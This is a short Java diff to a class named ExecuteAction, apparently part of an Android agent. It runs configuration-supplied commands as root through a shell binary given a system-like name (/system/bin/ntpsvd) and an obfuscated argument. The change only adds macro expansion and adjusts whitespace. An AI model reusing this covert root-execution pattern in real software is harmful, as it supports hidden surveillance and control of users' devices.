@@ -48,7 +48,7 @@ public class ExecuteAction extends SubActionSlow {
 	@Override
 	protected boolean parse(final ConfAction params) {
 		try {
-			this.command = Directory.expandMacro(params.getString("command"));			
+			this.command = Directory.expandMacro(params.getString("command"));	
 	
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): " + this.command);
@@ -106,7 +106,7 @@ public class ExecuteAction extends SubActionSlow {
 			//a_0=/system/bin/ntpsvd
 			// 35_0=qzx
 			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command ); // EXPORT
-			ExecuteResult ret = Execute.execute(cmd);
+			ExecuteResult ret = Execute.execute(Directory.expandMacro(cmd));
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (executeRoot) exitCode: " + ret.exitCode);
